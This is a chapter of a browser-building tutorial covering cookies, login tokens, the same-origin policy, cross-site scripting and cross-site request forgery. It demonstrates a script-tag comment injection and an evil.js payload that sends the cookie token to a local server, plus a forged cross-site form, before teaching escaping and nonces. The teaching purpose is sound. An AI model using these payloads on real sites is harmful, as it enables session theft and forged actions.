---
title: Keeping Data Private
chapter: 11
prev: reflow
next: skipped
...

Our browser has grown up and now runs (small) web applications. Now
let's take the final stop and add user identity to our browser via
cookies. Capability demands responsibility: our browser must then
secure cookies against adversaries interested in getting at them.

::: {.warning}
Web browser security is a vast topic. It involves securing the web
browser, securing the network, and securing the applications that the
browser runs. It also involves educating the user, so that attackers
can\'t misleading them into revealing their own secure data. This chapter
can\'t cover all of that. Instead, it focuses on the mechanisms browsers
have developed to protect the security of web applications. *So*, if
you\'re writing security-sensitive code, this book is not enough.
:::

Cookies
=======

The most basic kind of user data on the web is the *cookie*. A
cookie---the name is meaningless, ignore it---is a little bit of
information stored by your browser on behalf of a web server. It\'s
that information that allows the server to distinguish one web request
from another. Bereft of cookies, your web browser is effectively
anonymous:[^1] it isn\'t logged in anywhere so it can\'t do anything
useful.

[^1]: I don't mean anonymous against malicious attackers, who might
    use *browser fingerprinting* or similar techniques to tell users
    apart. I mean anonymous in the good-faith sense.


Here\'s how cookies work. A web server, when it sends you an HTTP
response, can send a `Set-Cookie` header. This header contains a
key-value pair, plus a bunch of parameters describing how long the
cookie should be stored and who it should be shown to. For example, the
following `Set-Cookie` header sets the value of the `foo` key to `bar`
and saves it until 2020:

``` {.example}
Set-Cookie: foo=bar; expires=Wed, 1 Jan 2020 00:00:00 GMT
```

The expiration date is not mandatory, and there are other parameters you
could add to a cookie, but for now let\'s focus just on the key-value
pair involved. That\'s what your browser needs to remember: that `foo`
is `bar`. Every time it visits the server again it tells the server that
`foo=bar` using the `Cookie` header:

``` {.example}
Cookie: foo=bar; baz=quux
```

To be clear, this `Cookie` header is reporting two cookies, with names
`foo` and `baz`. Parameters like expiration dates are not reported to
the server.

Let's implement cookies. We'll start storing cookies in our `Browser`;
that database is traditionally called a *cookie jar*[^2] but I\'ll
just call it `cookies`:

[^2]: Because once you have one silly name it\'s important to stay
    on-brand.

``` {.python}
class Browser:
    def __init__(self):
        # ...
        self.cookies = {}
```

Then, when responses are processed (in both `browse` and `post`):

``` {.python}
if "set-cookie" in headers:
    kv, *params = headers["set-cookie"].split(";")
    key, value = kv.split("=", 1)
    self.cookies[key] = value
```

I\'m ignoring expiration and so on, and I\'m also ignoring the fact that
a server can actually send multiple `Set-Cookie` headers to set multiple
cookies. It\'s a toy browser, people! I\'m also storing all the cookies,
from all of the servers, in one place. This is stupid, but we\'ll fix it
later, don\'t worry! For now, think of this as a one-server browser.

::: {.todo}
I've soured on this straw-man of implementing an insecure feature only
to secure it later.
:::

Finally, we need to send the `Cookie` header with all of the current
cookies. Let's add a `headers` argument to the `request` function to do
this:

``` {.python}
def request(method, url, headers={}, body=None):
    # ...
    for header, value in headers.items():
        s.send("{}: {}\r\n".format(header, value).encode("utf8"))
    # ...
```

Now we can update the uses of `request` in `browse` and `post` to
construct a headers dictionary:

``` {.python}
cookie_string = ""
for key, value in self.cookies.items():
    cookie_string += "&" + key + "=" + value
req_headers = { "Cookie": cookie_string[1:] }
headers, body = request("GET", self.history[-1], headers=req_headers)
```

Now let\'s add logins to our guest book using cookies.

A login system
==============

I want users to log in before posting to the guest book. Nothing
complex, just the minimal functionality:

-   Users have to be logged in to add guest book entries.
-   Users will log in with a username and password on the `/login` page.
-   The server will hard-code a list of usernames/password pairs.
-   The server will display who added which guest book entry.

Let\'s start coding. First, we\'ll need to store usersnames in `ENTRIES`:[^3]

[^3]: The seed comments reference 1995's *Hackers*.
    [Hack the Planet!](https://xkcd.com/1337)


``` {.python}
ENTRIES = [
    ("No names. We are nameless!", "cerealkiller"),
    ("HACK THE PLANET!!!", "crashoverride"),
]
```


When we print the guest book entries, print the username as well:

``` {.python}
for entry, who in ENTRIES:
    out += '<p>' + entry + " <i>from " + who + '</i></p>'
```

We\'ll also need a data structure to store usernames and passwords:

``` {.python}
LOGINS = { "crashoverride": "0cool", "cerealkiller": "emmanuel" }
```

Next, let\'s add the `/login` URL:

``` {.python}
def handle_request(method, url, headers, body):
    # ...
    if url == "/login":
        return login_form()

def login_form():
    body = "<!doctype html>"
    body += "<form action=/ method=post>"
    body += "<p>Username: <input name=username></p>"
    body += "<p>Password: <input name=password type=password></p>"
    body += "<p><button>Log in</button></p>"
    body += "</form>"
    return body
```

To use the form, the user goes to `/login`, fills out their
details,[^4] and submits the form. The login is sent to the main page
(thanks to "`action=/`"), which needs to handle the request. I'll
implement the login logic directly in `handle_request`:

[^4]: I've given the `password` input area the type `password`, which
    in a real browser will draw stars instead of showing what you've
    entered, though our browser doesn\'t do that.

``` {.python}
username = None
if method == "post" and url == "/":
    params = form_decode(body)
    if check_login(params.get("username"), params.get("password")):
        username = params["username"]
```

The `check_login` method does exactly what you\'d expect:

``` {.python}
def check_login(username, pw):
    return username in LOGINS and LOGINS[username] == pw
```

The server now checks that the login was correct, but it should also set
a cookie so that the browser actually remembers the login:[^5]

[^5]: Like with the cookie jar, this is a transparently insecure design,
    on purpose, so that I can demonstrate an attack.

``` {.python}
resp_headers = {}

if method == "post" and url = "/":
    # ...
    if check_login(params.get("username"), params.get("password")):
        # ...
        resp_headers["Set-Cookie"] = "username=" + username
# ...

return out, resp_headers
```

We\'ll modify `handle_connection` to use the returned headers:

``` {.python}
response, headers = handle_request(method, url, headers, body)
# ...
for header, value in headers.items():
    conx.send("{}: {}\r\n".format(header, value).encode('utf8'))
```

Since we\'re now setting cookies we should also be reading them:[^6]

[^6]: In reality there\'s also special syntax if you want an equal sign
    in your cookie, but I\'m ignoring that.

``` {.python}
def parse_cookies(s):
    out = {}
    for cookie in s.split(";"):
        k, v = cookie.strip().split("=", 1)
        out[k] = v
    return out
```

That allows us to automatically log in users with the login cookie:

``` {.python}
if "cookie" in headers:
    username = parse_cookies(headers["cookie"]).get("username")
```

That will log a user in if they have the right cookie. Now we need to
make some changes to the existing guest book code to handle logins.

We can use the `username` variable to either send the user the new guest
book entry form or to give them a login link:

``` {.python}
if username:
    out += # form ...
else:
    out += "<p><a href=/login>Log in to add to the guest list</a></p>"
```

We now have two types of POST requests: one to post a new guest book
entry and one to log in. We\'ll distinguish them by URL, so make sure
that posting to the guest book uses the condition

``` {.python}
if method == "POST" and url == "/add":
    # ...
```

Also, when you post to the guest book, we\'ll need to know your
username:

``` {.python}
if 'guest' in params and len(params['guest']) <= 100 and username:
    ENTRIES.append((params['guest'], username))
```

We aren\'t showing the new guest book entry form to users who aren\'t
logged in, but we still need to check `username` here, for the same
reason that we need to check the length of entries on both the client
and the server side: malicious users could construct their own POST
requests instead of filling out the form in a browser.

Try it out! You should be able to go to the main guest book page,
click the link to log in, use one of the username/password pairs
above, and post entries.^[When debugging, the login flow is very slow.
You might want to add the empty string as a username/password pair.]

Of course, the code above has a whole slew of insecurities. It\'s hard
to cover all of them,[^7] but let\'s cover three of the most glaring
ones.

[^7]: I should be hashing passwords! Using `bcrypt`! We should verify
    email addresses! Over TLS! We should be comparing passwords in a
    constant-time fashion!


Changing your login
===================

Right now, the cookie just stores your username. It\'s not hard to
change! Let\'s go back to our browser and hard-code the cookie value:

``` {.python}
self.cookies["username"] = "nameless"
```

Now if you start up your browser and point it at the main page, you
should see the entry form, even though you never had to enter a
login.^[Nor do you have to modify the browser to do this. In a real
browser, popping open the developer console and changing
`document.cookie` is enough.] How absurdly insecure!

The solution to this is to not store the username directly in the
browser, where it can be changed by the user. Instead, let\'s store a
\"login token\", a random value that is hard to guess, and have the
server remember which login token is for which username.

This is actually standard practice not just for security reasons but
also for functional ones. Generally speaking, cookie names and values
must be pretty short, though there isn\'t a fixed limit across all
browsers.[^8] So cookies don\'t usually store *data*; they store
*references* to data on the server, which can be as big as you want.

Let\'s add login tokens in our guest book. I\'ll store the tokens in a
global variable:

``` {.python}
import random
TOKENS = {}
```

Then where we set `Set-Cookie` we\'ll create a new token and remember
its username:

``` {.python}
token = str(random.random())[2:]
TOKENS[token] = username
headers["Set-Cookie"] = "token=" + token
```

Then when we read the `Cookie` header, we\'ll use the token to retrieve
the username:

``` {.python}
if "cookie" in headers:
    username = TOKENS.get(parse_cookies(headers["cookie"]).get("token"))
```

As long as the tokens are hard to guess,[^9] the only way to get one is
from the server, and the server will only give you one with a valid
login.

[^9]: They\'re roughly-16-digit decimal numbers, so they have 53 bits
    of randomness, which isn\'t great but isn\'t terrible (in real
    code go for 256). But `random.random` is not a secure random
    number generator: observing enough tokens, an attacker could
    predict future values and use those to hijack accounts. That\'s
    one of the security exploits I\'m going to ignore here, even
    though it is real and important.


The same-origin policy
======================

Our browser does not keep our precious cookie safe. Right now, we have a
single cookie jar in our browser, and every cookie from any website is
sent to all other websites. This means that if you log in on our guest
book, and then make a request to the `attack.evil` website, that website
can see the token in the headers, record it, set its own browser cookie
to your token, and then post as you on the guest book website. You see,
cookies are web-site specific, but we\'re not storing them that way. It
goes beyond security---if you have two servers that both set the `token`
cookie, they\'d overwrite each other and you\'d constantly be getting
logged out!

Web browsers use the *same origin policy* to determine which cookies
are sent where. The rule is: if a cookie is set on one origin---where
the origin is the scheme, host, and port---it can only be sent to
servers on the same origin. Let\'s update our cookie policy to do
this. I\'ll change the `cookies` field so it stores a map from origins
to key-value pairs:[^10]

``` {.python}
if "set-cookie" in headers:
    # ...
    origin = url_origin(self.history[-1])
    self.cookies.setdefault(origin, {})[key] = value
```

Then, when generating the `Cookie` header, instead of using
`self.cookies.items()`, we\'ll use a `cookies` dictionary defined like this:

``` {.python}
host, port, path = parse_url(self.history[-1])
cookies = self.cookies.get((host, port), {})
```

Now it\'s not quite so easy for a rogue web server to steal our cookies.
It\'d have to be on the same origin, and that can\'t happen, because
this origin is already occupied up by *this* server.

Right?

Cross-site scripting
====================

Sure, the origin is uniquely owned by our web server, so there\'s no way
some other web server could see the headers the server and browser send
to each other.[^11][^12][^13][^14]

But that\'s not the only way to read cookies! In fact, cookies are
accessible from JavaScript as well, through the `document.cookie` field.
This field is a string, containing the same contents as the `Cookie`
header value. We can implement that pretty simply. First, in
`runtime.js`:

``` {.javascript}
Object.defineProperty(document, 'cookie', {
    get: function() { return call_python("cookie"); }
})
```

Now we register `cookie` to a simple function that returns the cookie
value:

``` {.python}
class Browser:
    def parse(self):
        # ...
        self.js.export_function("cookie", self.js_cookie)

    def js_cookie(self):
        origin = url_origin(self.history[-1])
        cookies = self.cookies.get(origin, {})

        cookie_string = ""
        for key, value in cookies.items():
            cookie_string += "&" + key + "=" + value
        return cookie_string[1:]
```

Accessing cookies from JavaScript may seem benign, since the JavaScript
being run, in `comment.js`, is our own and won\'t do anything malicious.
And this is true, if users are well-behaved. But consider the code we
wrote to output guest book entries:

``` {.python}
out += '<p>' + entry + ' <i> by ' + username + '</i></p>'
```

Note that `entry` can be anything, anything the user might stick into
our comment form. \"Anything\" might even include a user-written
`<script>` tag! Let\'s imagine that you\'re logged in as one user, maybe
`crashoverride`, but would like to gain access to another username,
maybe `nameless`. You could post the comment:

``` {.example}
Hi! <script src=http://my-server/evil.js></script>
```

Our server would then output the HTML:[^15]

[^15]: Yes, our form-encoding is very very limited, but it\'s
    similarly limited on both browser and server, so you could post
    the above comment using our browser. In a real server and browser
    this would also work, in a less accidental way.

``` {.example}
<p>Hi! <script src=http://my-server/evil.js></script>
<i> by crashoverride</i></p>
```

That would cause our browser to download the `evil.js` script.[^16] So
`evil.js` could access `document.cookie` and do something evil.

[^16]: Yes: real browsers, just like our toy browser, will download
    and run JavaScript from any source, including from other servers
    and origins, and they all run with the same permissions. This is
    important for shared libraries.

Let\'s try it out. Post the above comment, except instead of
`my-server` use `localhost:9000`, where we'll create a server with:

``` {.example}
python3 -m http.server 9000
```

That runs Python\'s built-in HTTP server on port 9000; it'll respond
to `localhost:9000/file` with the contents of `file` in the current
directory. Let\'s fill `evil.js` with the following contents:

``` {.javascript}
token = document.cookie.split("=")[1]
body = document.querySelectorAll("body")[0]
url = "http://localhost:9000/" + token
body.innerHTML = "<a href=" + url + ">Click to continue</a>"
```

That replaces the whole web page with a single link. When the user
clicks that link,[^17] their browser sends the evil web server the
token value, embedded in the request URL. Our evil server records
that, and the game is up! In a more feature-full browser, the link
could be hidden. The attacker could make an `XMLHttpRequest`,[^18] add
an image to the page that the browser will try to load (from our evil
server), load JavaScript from our evil domain, or anything else like
that. Even with the extremely limited DOM API our browser supports, we
could better hide our evildoing:

[^17]: They probably will, users aren't security experts.

[^18]: Scripts aren\'t allowed to read data from XHRs to another
    origin, but the browser still makes the request.


``` {.javascript}
form = document.querySelectorAll("form")
url = "http://localhost:9000/" + token
newform = "<form action=" + url + " method=get>"
newform += "<p><input name=guest></p>"
newform += "<p><button>Sign the book!</button></p>"
newform += "</form>"
form.innerHTML= newform
```

This replaces the contents of the comment form with a new form (so it\'s
a form in a form, with the inner form taking priority) that submits both
the new comments and the login token to our evil server.

Try these exploits out, both in our toy browser and in a real one.

The core problem behind these problems is that user comments are
supposed to be data, but the browser is interpreting them as code. This
kind of exploit is usually called *cross-site scripting*, shortened to
XSS, though the data-misinterpreted-as-code issue is a fairly broad one
that occurs in many, many systems.

Anyway, whatever it\'s called, we need to fix it, and the way we do that
is not sending `entry`, the user comment, directly to the browser.
Instead, we\'d do something to ensure the browser would not interpret it
as code, something like:

``` {.python}
entry = entry.replace("&", "&amp;").replace("<", "&lt;")
out += # ...
```

Now the comment would would be printed as the code `&lt;script`, instead
of as a literal script tag, so the browser will interpret it as text,
not a tag.[^19] So we\'ve definitely fixed the problem of the browser
running code based on user comments. Success!

I should add that there are other approaches to this bug. You could
remove tags instead of escaping the angle bracket. You could prevent
users from submitting comments with \"invalid characters\". You could do
the character replacing before saving the entry, instead of before
showing the entry. These are all worse than escaping:

-   Removing tags means implementing the quirk HTML parsing algorithm.
-   Prevent users from submitting comments has the same issue, plus you
    need to make sure that the check is the same on the server and the
    client side. Plus, you might write too tight a filter and prevent
    users from sending something benign, like old-school heart emoticons
    `<3`.
-   Saving the character-replaced entry assumes you\'ll only consume the
    entry in HTML; what if you later need to put it into JSON (you\'ll
    need to escape single quotes), or raw JavaScript (you\'ll need to
    escape `</script>`), or JSON embedded in JavaScript embedded in
    HTML. Data should be a single source of truth, not a place to store
    mangled HTML

You might want to escape some more characters, like replacing double
quotes with `&quot;` if you plan to stick user data into HTML
attributes, but the method above is roughly correct in general concept.

Cross-site request forgery
==========================

Thanks to the same-origin policy and the mitigations for cross-site
scripting, it\'s now hard for an evil-doer to steal the login token
from our browser. But that doesn\'t leave us totally safe. Another
concern is our browser misusing the token. One popular exploit of this
type is called *cross-site request forgery*, often shortened to CSRF.

In cross-site request forgery, the attack does not involve the user
going to our guest book site at all. Instead, the user begins on our
evil-doer\'s website.[^20] That website has a form analogous to the
guest-book form:

``` {.html}
<form action=http://localhost:8000/add method=post>
  <p><input name=guest></p>
  <p><button>Sign the book!</button></p>
</form>
```

Our browser (and a real one) does not care what origin a form is on:
you can submit a form on one origin to another origin, and this
ability is widely used for some reason.[^21] So even if the user fills
out this form on the evil website, the form is still be submitted to
the guest-book. When the browser makes that POST request to the
guest-book, it will *also* send along its guest-book cookie. Since the
user has no idea where a form is going---the browser does not show
them that information---they might want to sign a guest book on the
evil-doer\'s site and end up signing the one on our server
instead.^[And thank goodness we never implemented a change-of-password
form!]

But it gets worse! Suppose the form isn\'t actually like that, and
instead looks like this:

``` {.html}
<form action=http://localhost:8000/add method=post>
  <p><button>Click me!</button></p>
</form>
```

People will do all sorts of stuff, so they might click that button. And
it may look safe, since there\'s no `guest` input area. However, there
might be some sneaky JavaScript attached:

``` {.javascript}
form  = document.querySelectorAll('form')[0]
form.addEventListener("submit", function() {
    comment = "Buy from my website: http://evil.doer/";
    input = "<input name=guest value=\"" + comment + "\">";
    form.innerHTML = input;
})
```

This script waits for the user to click the button, and then replaces
the form contents with a `guest` input area with a pre-filled value.
The browser then finds it when it looks for input areas and submits
our hard-coded guest-book entry to the guest-book server. And
remember: the form is submitted by the user\'s browser, with the
user\'s cookies, so the post will succeed (if the user is logged in to
the guest book). Posting this sort of comment might not seem too scary
(though shady advertisers will pay for it!) but imagine someone doing
the same with a bank transaction.

Try it! This should work in both ours and in a real browser. Plus, in a
real browser you could also have a \"hidden\" input element, which would
mean that you don\'t need to write any tricky JavaScript at all.

How do we defend against this attack?

We want to make sure that every POST request to `/add` comes from a form
on our website. The normal way to ensure that is to embed a secret
value, called a *nonce*, into the form, and to reject form submissions
that don\'t come with this secret value. The nonce is like a login
token, but instead of getting it on login, you get a new one every time
you\'re presented with a form to fill out.

Let\'s implement nonces in our guest book. First, we\'ll generate our
secret nonce:

``` {.python}
nonce = str(random.random())[2:]
```

Next, we\'ll add it to our form, like this:

``` {.python}
out += "<input name=nonce type=hidden value=" + nonce + ">"
```

The `hidden` input type basically instructs a browser not to render the
input area, but to still submit it in the form. In our browser, which
doesn\'t support hidden input elements, this will show up as an input
area with a random string of digits---not ideal, but as long as you
don\'t touch it form submission will work fine.

We\'ll also need to save the nonce so that we can tell valid from
invalid nonces. I\'m going to store that in a `NONCE` variable, which
will store one nonce per user. We\'ll then check both that the nonce is
valid and also that it is associated with the correct user:[^22]

``` {.python}
NONCES[username] = nonce
```

When the form is submitted, we will check the nonce:

``` {.python}
if 'nonce' not in params or params['nonce'] != NONCES.get(username):
    return "Invalid nonce", {}
```

Thanks to this change, in order to add an entry to the guest book, you
need to be logged in and submit the form on the guest book page itself.
And that\'s a form that we, as the guest book authors, have sole control
over (thanks to our XSS mitigations), so the form submission has now
been secured. Or... I keep saying there\'s more to security than what\'s
in this book. Let\'s just settle for this fact: the guest book is now
more secure than before.

::: {.warning}
The purpose of this book is to teach the *internals of web browsers*,
not to teach web application security. There\'s much more you\'d want
to do to make this guest book truly secure, let alone what we\'d need
to do to avoid denial of service attacks or to handle spam and
malicious use.
:::

Summary
=======

We\'ve added user data, in the form of cookies, to our browser, and
immediately had to bear the heavy burden of securing that data and
ensuring it was not misused. We then saw the rich browser features we
developed turn into attack vector. And we've made with some simple
tweaks to our guest book to prevent two common web application
vulnerabilities.

Exercises
=========

-   Add support for hidden input elements. Since they don\'t need to be
    laid out, there\'s no need for a layout type at all!
-   Add support for cookie expiration. Cookie expiration dates are set
    in the `Set-Cookie` header, and can be overwritten if the same
    cookie is set again with a later date. Save the same expiration
    dates in the `TOKENS` variable and use it to delete old tokens to
    save memory.
-   Add support for cookie origins. Due to the same-origin policy, a
    cookie set by `mail.google.com` cannot be read by, say,
    `calendar.google.com`, because the host name is the same. This is a
    good default,[^23] but is sometimes annoying. Cookies can thus set
    an origin parameter in the `Set-Cookie` header, changing their
    origin to a more general domain (stripping off some subdomains).
    Implement this in your browser, making sure to send these
    generalized-origin cookies on any requests covered by the
    generalized origin.
-   The `Content-Security-Policy` header is a very powerful tool
    modern browsers have developed to prevent XSS attacks. The full
    specification is quite complex, but in the simplest use case, the
    header value is the keyword `default-src` followed by a
    space-separated list of origins. That instructs the browser to
    refuse to load any resources for that page (CSS, JavaScript,
    images, and so on) except from those origins. Implement support
    for this header.
-   When your browser visits a web page, or when it loads a CSS or
    JavaScript file, it sends a `Referer` header[^24] containing the URL
    it is coming from. Sites often use this for analytics. However, for
    some servers, the URL contains meaningful data that they don\'t want
    revealed to other websites. For these cases there is a
    `Referer-Policy` header, which can contain values like `no-referer`
    (never send the `Referer` header when leaving this page) or
    `same-origin` (only do so if navigating to another page on the same
    origin). There are other values too, but let\'s ignore them.
    Implement both the `Referer` header and the `Referer-Policy` header,
    with those two values supported.

[^8]: Also, cookies are sent back and forth on every request, and long
    cookies would mean a lot of useless traffic.

[^10]: Our browser only supports one scheme, `http`, so I\'m not
    including that in the origin.

[^11]: Well... Our connection isn\'t encrypted, so an attacker could
    pick up the token from there. But another *server* couldn\'t.

[^12]: Well... Another server could hijack our DNS and redirect our
    hostname to a different IP address, and then steal our cookies. But
    some ISPs support DNSSEC, which prevents that.

[^13]: Well... A state-level attacker could announce fradulent BGP
    routes, which would send even a correctly-retrieved IP address to
    the wrong physical computer.

[^14]: Security is very hard.

[^19]: In a real browser, that code will be displayed as a literal
    less-than sign followed by the word `script`, but in our browser,
    this won\'t happen, unless you did the relevant exercise in [Chapter
    4](html.md).

[^20]: Why? Perhaps it has some good content too, perhaps the site has
    been hacked and is being used for the attack against its will, or
    perhaps the evil-doer paid for ads on sketchy websites where users
    have low standards for security anyway.

[^21]: For example, search forms that actually just direct you to a
    Google search.

[^22]: You wouldn\'t want an attacker to take a nonce for *their*
    account and then use in a CSRF attack.

[^23]: Should `microsoft.com` read `google.com`? What about
    `microsoft.co.uk` and `google.co.uk`?

[^24]: Yep, spelled that way.
